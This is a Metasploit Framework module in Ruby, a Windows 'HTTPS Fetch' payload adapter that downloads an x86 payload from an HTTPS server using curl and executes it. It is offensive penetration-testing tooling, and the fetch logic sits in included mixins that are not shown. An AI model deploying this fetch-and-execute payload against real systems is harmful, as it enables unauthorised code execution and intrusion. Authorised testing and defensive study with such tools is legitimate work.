##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::Https
  include Msf::Payload::Adapter::Fetch::WindowsOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTPS Fetch',
        'Description' => 'Fetch and execute an x86 payload from an HTTPS server.',
        'Author' => 'Brendan Watters',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X86,
        'AdaptedPlatform' => 'win'
      )
    )
    deregister_options('FETCH_COMMAND')
    register_options(
      [
        # Certutil does not support insecure mode
        Msf::OptEnum.new('FETCH_COMMAND', [true, 'Command to fetch payload', 'CURL', %w[CURL]])
      ]
    )
  end
end
